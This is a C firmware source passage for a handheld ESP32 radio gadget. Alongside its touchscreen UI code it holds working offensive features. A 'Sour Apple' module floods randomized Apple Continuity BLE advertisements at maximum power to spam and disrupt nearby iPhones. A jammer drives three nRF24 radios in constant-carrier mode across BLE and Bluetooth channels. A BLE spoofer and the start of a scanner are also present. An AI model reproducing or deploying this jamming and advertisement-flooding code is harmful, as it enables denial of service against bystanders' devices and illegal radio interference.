  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_sort_down_minus, bitmap_icon_sort_up_plus, bitmap_icon_key,
      bitmap_icon_power, bitmap_icon_go_back};

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  if (!BleSpoofer_uiDrawn) {
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_fill_rect(&(tft), 80, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), BleSpoofer_iconX[i], BleSpoofer_iconY,
                            icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    BleSpoofer_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), BleSpoofer_iconX[activeIcon],
                          BleSpoofer_iconY, icons[activeIcon], ICON_SIZE,
                          ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          BleSpoofer_changeDeviceTypePrev();
          break;
        case 1:
          BleSpoofer_changeDeviceTypeNext();
          break;
        case 2:
          BleSpoofer_changeAdvTypeNext();
          break;
        case 3:
          BleSpoofer_toggleAdvertising();
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > BleSpoofer_iconX[i] && x < BleSpoofer_iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), BleSpoofer_iconX[i],
                                    BleSpoofer_iconY, icons[i], ICON_SIZE,
                                    ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void BleSpoofer_spooferSetup(void) {
  setTouchButtonInputEnabled(true);
  bleSetSpooferNavLabels();
  BleSpoofer_spooferResetPanelCache();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  setupTouchscreen();

  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);

  display_fill_rect(&(tft), 0, 20, 240, 16, DARK_GRAY);
  display_set_text_font(&(tft), 1);
  display_set_text_color_1(&(tft), TFT_WHITE);
  display_set_text_size(&(tft), 1);
  display_set_cursor(&(tft), 5, 24);

  BleSpoofer_updateSpoofer();
  BleSpoofer_runUI();

  BleSpoofer_Printspoofer(TEXT("[!!] System Diagnostics"), TFT_RED, true);
  redrawTouchButtonBar();

  for (int i = 0; i <= 4; i++) {
    BleSpoofer_sppferLoadingBar(i);
    sys_sleep_ms(bleRandInt_1(500));
    redrawTouchButtonBar();
  }

  BleSpoofer_Printspoofer(TEXT("[+] System Ready!"), TFT_GREEN, true);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  BleSpoofer_pAdvertising = ble_service_advertiser();

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_SELECT, GPIO_MODE_INPUT);
#endif

  BleSpoofer_uiDrawn = false;
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  redrawTouchButtonBar();
}

void BleSpoofer_spooferLoop(void) {
  static unsigned long lastUpdate = 0;
  const unsigned long updateInterval = 50;

  unsigned long now = sys_monotonic_ms();
  if (now - lastUpdate >= updateInterval) {
    lastUpdate = now;

    if (feature_active && isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
      return;
    }

    BleSpoofer_runUI();
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

    BleSpoofer_handleButtonPress(BTN_RIGHT, BleSpoofer_changeDeviceTypeNext);
    BleSpoofer_handleButtonPress(BTN_LEFT, BleSpoofer_changeDeviceTypePrev);

    BleSpoofer_handleButtonPress(BTN_DOWN, BleSpoofer_changeAdvTypeNext);
    BleSpoofer_handleButtonPress(BTN_UP, BleSpoofer_toggleAdvertising);
  }
}

void BleSpoofer_exit(void) {
  BleSpoofer_spooferResetPanelCache();

  if (BleSpoofer_isAdvertising && BleSpoofer_pAdvertising) {
    ble_advertising_stop(BleSpoofer_pAdvertising);
    BleSpoofer_isAdvertising = false;
  }
}

static bool SourApple_uiDrawn = false;

#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 1

static int SourApple_iconX[ICON_NUM] = {10};
static int SourApple_iconY = STATUS_BAR_Y_OFFSET;

ble_advertiser_t* SourApple_Advertising;
text_t SourApple_device_uuid = {.data = "00003082-0000-1000-9000-00805f9b34fb"};

uint8_t SourApple_packet[17];

#undef MAX_LINES
#define MAX_LINES 30
enum { SourApple_lines_COUNT = MAX_LINES, SourApple_lines_OFFSET = 0 };
_Static_assert(SourApple_lines_OFFSET + SourApple_lines_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define SourApple_lines                  \
  (*(text_t(*)[SourApple_lines_COUNT]) & \
   feature_text_slots[SourApple_lines_OFFSET])
int SourApple_currentLine = 0;
int SourApple_lineNumber = 1;
enum { SourApple_lineHeight = 14 };

void SourApple_runUI(void) {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  if (!SourApple_uiDrawn) {
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), SourApple_iconX[i], SourApple_iconY,
                            icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    SourApple_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), SourApple_iconX[activeIcon], SourApple_iconY,
                          icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  static bool s_backIconHeld = false;
  const unsigned long touchCheckInterval = 25;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x = 0;
    int y = 0;
    bool hitBack = false;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > SourApple_iconX[i] && x < SourApple_iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              hitBack = true;
            }
            break;
          }
        }
      }
    }
    if (hitBack && !s_backIconHeld) {
      feature_exit_requested = true;
    }
    s_backIconHeld = hitBack;
    lastTouchCheck = sys_monotonic_ms();
  }
}

void SourApple_updatedisplay(void) {
  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  SourApple_runUI();
  display_set_text_color_2(&(tft), TFT_GREEN, TFT_BLACK);
  display_set_text_size(&(tft), 1);

  const int scrollBottom = bleContentBottom();
  for (int offset = 0; offset <= SourApple_lineHeight; offset += 2) {
    const int baseY = (MAX_LINES - 1) * SourApple_lineHeight - offset + 51;
    if (baseY + SourApple_lineHeight <= scrollBottom) {
      display_fill_rect(&(tft), 0, baseY, 240, SourApple_lineHeight, TFT_BLACK);
    }

    for (int i = 0; i < MAX_LINES; i++) {
      int y = -SourApple_lineHeight + (i * SourApple_lineHeight) + offset;
      const int drawY = y + 51;
      if (y >= -SourApple_lineHeight &&
          drawY + SourApple_lineHeight <= scrollBottom) {
        display_fill_rect(&(tft), 0, drawY, 240, SourApple_lineHeight,
                          TFT_BLACK);
        display_set_cursor(&(tft), 5, drawY + 4);
        display_print(&(tft), (SourApple_lines[i]).data);
      }
    }
    sys_sleep_ms(5);
  }
  ble_advertising_stop(SourApple_Advertising);
}

void SourApple_addLineToDisplay(text_t newLine) {
  for (int i = MAX_LINES - 1; i > 0; i--) {
    SourApple_lines[i] = SourApple_lines[i - 1];
  }
  SourApple_lines[0] = newLine;
  SourApple_updatedisplay();
}

void SourApple_displayAdvertisementData(void) {
  text_t lineStr = text_join_cstr((TEXT(SourApple_lineNumber)).data, " -> ");
  SourApple_lineNumber++;

  text_t dataStr = {.data = "0x"};
  text_append_cstr(&(dataStr), (TEXT_FORMAT(SourApple_packet[1], 16)).data);

  text_append_cstr(&(dataStr), ",0x");
  text_append_cstr(&(dataStr), (TEXT_FORMAT(SourApple_packet[2], 16)).data);
  text_append_cstr(&(dataStr), (TEXT_FORMAT(SourApple_packet[3], 16)).data);

  text_append_cstr(&(dataStr), ",0x");
  text_append_cstr(&(dataStr), (TEXT_FORMAT(SourApple_packet[7], 16)).data);

  SourApple_addLineToDisplay(text_join_cstr((lineStr).data, (dataStr).data));
}

ble_adv_data_t SourApple_getOAdvertisementData(void) {
  ble_adv_data_t advertisementData = (ble_adv_data_t){0};
  uint8_t i = 0;

  SourApple_packet[i++] = 17 - 1;
  SourApple_packet[i++] = 0xFF;
  SourApple_packet[i++] = 0x4C;
  SourApple_packet[i++] = 0x00;
  SourApple_packet[i++] = 0x0F;
  SourApple_packet[i++] = 0x05;
  SourApple_packet[i++] = 0xC1;
  const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d,
                           0x2f, 0x01, 0x06, 0x20, 0xc0};
  SourApple_packet[i++] = types[rand() % sizeof(types)];
  esp_fill_random(&SourApple_packet[i], 3);
  i += 3;
  SourApple_packet[i++] = 0x00;
  SourApple_packet[i++] = 0x00;
  SourApple_packet[i++] = 0x10;
  esp_fill_random(&SourApple_packet[i], 3);

  ble_adv_append(&(advertisementData), ((const uint8_t*)(SourApple_packet)),
                 17);
  return advertisementData;
}

void SourApple_sourappleSetup(void) {
  setTouchButtonInputEnabled(true);
  bleSetExitOnlyNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  display_set_text_size(&(tft), 1);
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  SourApple_uiDrawn = false;

  setupTouchscreen();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  SourApple_Advertising = ble_service_advertiser();
  redrawTouchButtonBar();
}

void SourApple_sourappleLoop(void) {
  if (feature_active && featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  SourApple_runUI();

  ble_adv_data_t oAdvertisementData = SourApple_getOAdvertisementData();

  ble_advertising_service_uuid(SourApple_Advertising,
                               (SourApple_device_uuid).data);
  (SourApple_Advertising->data = oAdvertisementData);

  (SourApple_Advertising->min_interval = 0x20);
  (SourApple_Advertising->max_interval = 0x20);
  ble_advertising_preferred(SourApple_Advertising, 0x20, 0x20);

  ble_advertising_start(SourApple_Advertising);

  sys_sleep_ms(40);
  SourApple_displayAdvertisementData();
}

void SourApple_exit(void) {
  if (SourApple_Advertising) {
    ble_advertising_stop(SourApple_Advertising);
  }
}

rf24_t BleJammer_radio1 = {.cePin_ = CE_PIN_1,
                           .csnPin_ = CSN_PIN_1,
                           .spiSpeed_ = 16000000,
                           .payloadSize_ = 32,
                           .addrWidth_ = 5};
rf24_t BleJammer_radio2 = {.cePin_ = CE_PIN_2,
                           .csnPin_ = CSN_PIN_2,
                           .spiSpeed_ = 16000000,
                           .payloadSize_ = 32,
                           .addrWidth_ = 5};
rf24_t BleJammer_radio3 = {.cePin_ = CE_PIN_3,
                           .csnPin_ = CSN_PIN_3,
                           .spiSpeed_ = 16000000,
                           .payloadSize_ = 32,
                           .addrWidth_ = 5};

typedef enum BleJammer_OperationMode {
  BleJammer_BLE_MODULE,
  BleJammer_Bluetooth_MODULE
} BleJammer_OperationMode;
BleJammer_OperationMode BleJammer_currentMode = BleJammer_BLE_MODULE;

bool BleJammer_jammerActive = false;

int BleJammer_bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0,  1,  2,  4, 6,
                                      8,  22, 24, 26, 28, 30, 74, 76, 78, 80};
int BleJammer_ble_channels[] = {2, 26, 80};

const uint8_t BleJammer_BLE_channels[] = {2, 26, 80};
uint8_t BleJammer_channelGroup1[] = {2, 5, 8, 11};
uint8_t BleJammer_channelGroup2[] = {26, 29, 32, 35};
uint8_t BleJammer_channelGroup3[] = {80, 83, 86, 89};

#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT TFT_HEIGHT
#undef LINE_HEIGHT
#define LINE_HEIGHT 12
#undef MAX_LINES
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

enum { BleJammer_Buffer_COUNT = MAX_LINES, BleJammer_Buffer_OFFSET = 0 };
_Static_assert(BleJammer_Buffer_OFFSET + BleJammer_Buffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define BleJammer_Buffer                  \
  (*(text_t(*)[BleJammer_Buffer_COUNT]) & \
   feature_text_slots[BleJammer_Buffer_OFFSET])
uint16_t BleJammer_Buffercolor[MAX_LINES];
int BleJammer_Index = 0;

volatile bool BleJammer_modeChangeRequested = false;
volatile bool BleJammer_jammerToggleRequested = false;

unsigned long BleJammer_lastButtonPressTime = 0;
const unsigned long BleJammer_debounceDelay = 500;

enum { BleJammer_JAMMER_LOG_TOP = 48 };

static int BleJammer_jammerVisibleLines(void) {
  return bleMaxLinesInZone(BleJammer_JAMMER_LOG_TOP, LINE_HEIGHT);
}

static bool BleJammer_jammerLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

void BleJammer_scroll(void) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    BleJammer_Buffer[i] = BleJammer_Buffer[i + 1];
    BleJammer_Buffercolor[i] = BleJammer_Buffercolor[i + 1];
  }
}

void BleJammer_Print(text_t text, uint16_t color, bool extraSpace) {
  const int visibleLines = BleJammer_jammerVisibleLines();
  if (BleJammer_Index >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      BleJammer_Buffer[i] = BleJammer_Buffer[i + 1];
      BleJammer_Buffercolor[i] = BleJammer_Buffercolor[i + 1];
    }
    BleJammer_Index = visibleLines - 1;
  }

  BleJammer_Buffer[BleJammer_Index] = text;
  BleJammer_Buffercolor[BleJammer_Index] = color;
  BleJammer_Index++;

  if (extraSpace && BleJammer_Index < visibleLines) {
    BleJammer_Buffer[BleJammer_Index] = TEXT("");
    BleJammer_Buffercolor[BleJammer_Index] = WHITE;
    BleJammer_Index++;
  }

  for (int i = 0; i < BleJammer_Index && i < visibleLines; i++) {
    int yPos = (i * LINE_HEIGHT) + BleJammer_JAMMER_LOG_TOP;
    if (!BleJammer_jammerLineFits(yPos)) {
      continue;
    }

    display_fill_rect(&(tft), 5, yPos, display_width(&(tft)) - 10, LINE_HEIGHT,
                      TFT_BLACK);

    display_set_text_color_2(&(tft), BleJammer_Buffercolor[i], TFT_BLACK);
    display_set_cursor(&(tft), 5, yPos);
    display_print(&(tft), (BleJammer_Buffer[i]).data);
  }
}

void BleJammer_checkButtons(void) {
  unsigned long currentTime = sys_monotonic_ms();

  if (isButtonPressed(BTN_UP) &&
      currentTime - BleJammer_lastButtonPressTime > BleJammer_debounceDelay) {
    BleJammer_jammerToggleRequested = true;
    BleJammer_lastButtonPressTime = currentTime;
  }

  if (isButtonPressed(BTN_RIGHT) &&
      currentTime - BleJammer_lastButtonPressTime > BleJammer_debounceDelay) {
    BleJammer_modeChangeRequested = true;
    BleJammer_lastButtonPressTime = currentTime;
  }

  if (isButtonPressed(BTN_LEFT) &&
      currentTime - BleJammer_lastButtonPressTime > BleJammer_debounceDelay) {
    BleJammer_modeChangeRequested = true;
    BleJammer_lastButtonPressTime = currentTime;
  }
}

void BleJammer_configureRadio(rf24_t* radio, const uint8_t* channels,
                              size_t size) {
  rf24_set_auto_ack_1(&((*radio)), false);
  rf24_stop_listening(&((*radio)));
  rf24_set_retries(&((*radio)), 0, 0);
  rf24_set_pa_level(&((*radio)), RF24_PA_MAX, true);
  rf24_set_data_rate(&((*radio)), RF24_2MBPS);
  rf24_set_crc_length(&((*radio)), RF24_CRC_DISABLED);
  rf24_print_pretty_details(&((*radio)));

  for (size_t i = 0; i < size; i++) {
    rf24_set_channel(&((*radio)), channels[i]);
    rf24_start_const_carrier(&((*radio)), RF24_PA_MAX, channels[i]);
  }
}

void BleJammer_initializeRadiosMultiMode(void) {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (rf24_begin(&(BleJammer_radio1))) {
    BleJammer_configureRadio(&(BleJammer_radio1), BleJammer_channelGroup1,
                             sizeof(BleJammer_channelGroup1));
    radio1Active = true;
  }
  if (rf24_begin(&(BleJammer_radio2))) {
    BleJammer_configureRadio(&(BleJammer_radio2), BleJammer_channelGroup2,
                             sizeof(BleJammer_channelGroup2));
    radio2Active = true;
  }
  if (rf24_begin(&(BleJammer_radio3))) {
    BleJammer_configureRadio(&(BleJammer_radio3), BleJammer_channelGroup3,
                             sizeof(BleJammer_channelGroup3));
    radio3Active = true;
  }
}

void BleJammer_initializeRadios(void) {
  if (BleJammer_jammerActive) {
    BleJammer_initializeRadiosMultiMode();

  } else {
    rf24_power_down(&(BleJammer_radio1));
    rf24_power_down(&(BleJammer_radio2));
    rf24_power_down(&(BleJammer_radio3));
  }
}

void BleJammer_updateTFT(void) {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int previousMode = -1;

  const int bodyH = bleContentBottom() - 39;
  if (bodyH > 0) {
    display_fill_rect(&(tft), 0, 39, 240, bodyH, TFT_BLACK);
  }
  display_fill_rect(&(tft), 0, 19, 240, 16, DARK_GRAY);

  display_set_text_size(&(tft), 1);

  typedef struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  } ButtonGuide;
#define ButtonGuide_INITIALIZER {0}
  ;

  ButtonGuide buttons[] = {
      {BleJammer_jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
      {"MODE-", bitmap_icon_LEFT},
      {"MODE+", bitmap_icon_RIGHT}};

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    display_draw_bitmap(&(tft), xPos, yPosIcon, buttons[i].icon, 16, 16,
                        UI_ICON);

    display_set_text_color_2(&(tft), UI_TEXT, DARK_GRAY);
    display_set_cursor(&(tft), xPos + 18, yPosIcon + 4);
    display_print(&(tft), (TEXT(buttons[i].label)).data);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      display_draw_fast_v_line(&(tft), sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  display_draw_fast_h_line(&(tft), 0, 35, 240, UI_LINE);
}

void BleJammer_checkModeChange(void) {
  BleJammer_checkButtons();

  if (BleJammer_modeChangeRequested) {
    BleJammer_modeChangeRequested = false;
    BleJammer_currentMode =
        ((BleJammer_OperationMode)((BleJammer_currentMode + 1) % 2));
    BleJammer_initializeRadios();
    BleJammer_updateTFT();

    text_t modeText = {.data = "[+] Mode changed to: "};
    text_append_cstr(
        &(modeText),
        (TEXT((BleJammer_currentMode == BleJammer_BLE_MODULE) ? "BLE"
                                                              : "Bluetooth"))
            .data);
    BleJammer_Print(modeText, UI_TEXT, false);
  }

  if (BleJammer_jammerToggleRequested) {
    BleJammer_jammerToggleRequested = false;
    BleJammer_jammerActive = !BleJammer_jammerActive;
    BleJammer_initializeRadios();
    BleJammer_updateTFT();

    text_t jammerText = {.data = "[!] Jammer "};
    text_append_cstr(
        &(jammerText),
        (TEXT((BleJammer_jammerActive) ? "Activated" : "Deactivated")).data);
    BleJammer_Print(jammerText, UI_WARN, false);
  }
}

void BleJammer_blejamSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleSetJammerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  BleJammer_initializeRadios();
  setupTouchscreen();
  BleJammer_updateTFT();

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_SELECT, GPIO_MODE_INPUT);
#endif

  BleJammer_Print(TEXT("[+] System Ready!"), UI_WARN, true);
  redrawTouchButtonBar();
}

void BleJammer_blejamLoop(void) {
  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  BleJammer_checkModeChange();

  if (BleJammer_jammerActive) {
    if (BleJammer_currentMode == BleJammer_BLE_MODULE) {
      int randomIndex = bleRandInt_1((int)(sizeof(BleJammer_ble_channels) /
                                           sizeof(BleJammer_ble_channels[0])));
      int channel = BleJammer_ble_channels[randomIndex];
      rf24_set_channel(&(BleJammer_radio1), channel);
      rf24_set_channel(&(BleJammer_radio2), channel);
      rf24_set_channel(&(BleJammer_radio3), channel);

    } else if (BleJammer_currentMode == BleJammer_Bluetooth_MODULE) {
      int randomIndex =
          bleRandInt_1((int)(sizeof(BleJammer_bluetooth_channels) /
                             sizeof(BleJammer_bluetooth_channels[0])));
      int channel = BleJammer_bluetooth_channels[randomIndex];
      rf24_set_channel(&(BleJammer_radio1), channel);
      rf24_set_channel(&(BleJammer_radio2), channel);
      rf24_set_channel(&(BleJammer_radio3), channel);
    }
  }
}

void BleJammer_exit(void) {
  BleJammer_jammerActive = false;
  BleJammer_initializeRadios();
}

void BleSniffer_exit(void);

#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

ble_scan_t* BleScan_bleScan;
static ble_results_t BleScan_bleResults;
static bool BleScan_bleResultsValid = false;
bool BleScan_isScanning = false;
bool BleScan_isDetailView = false;
int BleScan_currentIndex = 0;
int BleScan_listStartIndex = 0;
bool BleScan_screenNeedsUpdate = true;
bool BleScan_fullScreenUpdate = true;

enum { BleScan_yshift = 30 };

// Deauther-like list geometry (bigger rows + paging + bottom nav/tab bar).
enum { BleScan_LIST_HEADER_Y = 50 };
enum { BleScan_LIST_FIRST_ROW_Y = BleScan_LIST_HEADER_Y + 20 };
enum { BleScan_LIST_ROW_H = 22 };
static int BleScan_current_page = 0;

static int BleScan_bleListBottomY(void) {
  return featureHasTouchNavBar() ? touchNavContentBottomY() - 4 : 300;
}

static int BleScan_bleDevicesPerPage(void) {
  return (BleScan_bleListBottomY() - BleScan_LIST_FIRST_ROW_Y) /
         BleScan_LIST_ROW_H;
}

static void BleScan_bleScanClearBody(void) {
  const int h = bleContentBottom() - 37;
  if (h > 0) {
    display_fill_rect(&(tft), 0, 37, 240, h, TFT_BLACK);
  }
}

static void BleScan_bleScanUpdateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (BleScan_isDetailView) {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "Back");
  } else {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "View");
  }
  redrawTouchButtonBar();
}

static void ble_scan_draw_row(int idx, bool selected) {
  if (idx < 0 || idx >= (int)BleScan_bleResults.count) return;
  if (idx < BleScan_listStartIndex ||
      idx >= BleScan_listStartIndex + BleScan_bleDevicesPerPage())
    return;
  const int row = idx - BleScan_listStartIndex;
  const int y = BleScan_LIST_FIRST_ROW_Y + row * BleScan_LIST_ROW_H;

  // Clear only this row (avoid overlapping next row).
  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, BleScan_LIST_ROW_H, TFT_BLACK);
  const ble_device_t* device = ble_results_device(&(BleScan_bleResults), idx);
  if (!device) return;
  text_t name = TEXT(strlen((ble_device_name(device)).data) > 0
                         ? (ble_device_name(device)).data
                         : "Unknown");
  if (strlen((name).data) > 22)
    name = text_join_cstr((text_slice(name, 0, 22)).data, "...");

  display_set_cursor(&(tft), 10, y);
  display_set_text_color_1(&(tft), selected ? ORANGE : WHITE);
  display_print(&(tft), (TEXT(selected ? "> " : "  ")).data);
  display_print_line_cstr(&(tft), (name).data);
}
void BleScan_updateBLEList(void);

unsigned long BleScan_lastButtonPress = 0;
const unsigned long BleScan_debounceTime = 200;

static bool BleScan_uiDrawn = false;

static int BleScan_iconX[ICON_NUM] = {220, 10};
static const unsigned char* BleScan_icons[ICON_NUM] = {bitmap_icon_undo,
                                                       bitmap_icon_go_back};

static void BleScan_drawButton(int x, int y, int w, int h, const char* label,
                               bool highlight, bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

static void BleScan_drawTabBar(const char* leftButton, bool leftDisabled,
                               const char* prevButton, bool prevDisabled,
                               const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    BleScan_bleScanUpdateNavLabels();
    return;
  }
  display_fill_rect(&(tft), 0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0])
    BleScan_drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton && prevButton[0])
    BleScan_drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton && nextButton[0])
    BleScan_drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static volatile bool BleScan_bgHasResults = false;
static volatile uint32_t BleScan_bgLastScanMs = 0;
static volatile bool BleScan_bgBleScanRunning = false;
static volatile bool BleScan_fgBleScanInProgress = false;
enum { BleScan_BG_BLE_SCAN_INTERVAL_MS = 15000 };
static bool BleScan_bleInitDone = false;
enum { BleScan_BG_BOOT_GRACE_MS = 6000 };
static uint32_t BleScan_bgBootMs = 0;

static void BleScan_stopBgBleScanIfRunning(void) {
  if (BleScan_fgBleScanInProgress || !BleScan_bleInitDone || !BleScan_bleScan)
    return;
  if (!BleScan_bgBleScanRunning) return;
  ble_scan_stop(BleScan_bleScan);
  BleScan_bgBleScanRunning = false;
}

static void BleScan_ensureBleInit(void) {
  if (BleScan_bleInitDone) return;

  BleScan_bleScan = ble_service_scan();
  (BleScan_bleScan->active = true);
  BleScan_bleInitDone = true;
}

void BleScan_pauseBackgroundScanner(void) {
  if (BleScan_bgBleScanRunning && BleScan_bleScan)
    ble_scan_stop(BleScan_bleScan);
  BleScan_bgBleScanRunning = false;
}
void BleScan_pollBackgroundScanner(void) {
  static uint32_t nextScan = 0;
  const uint32_t now = sys_monotonic_ms();
  if (!(*settings()).autoBleScan || feature_active || in_sub_menu) {
    BleScan_pauseBackgroundScanner();
    return;
  }
  if (now - BleScan_bgBootMs < BleScan_BG_BOOT_GRACE_MS) return;
  BleScan_ensureBleInit();
  if (BleScan_bgBleScanRunning) {
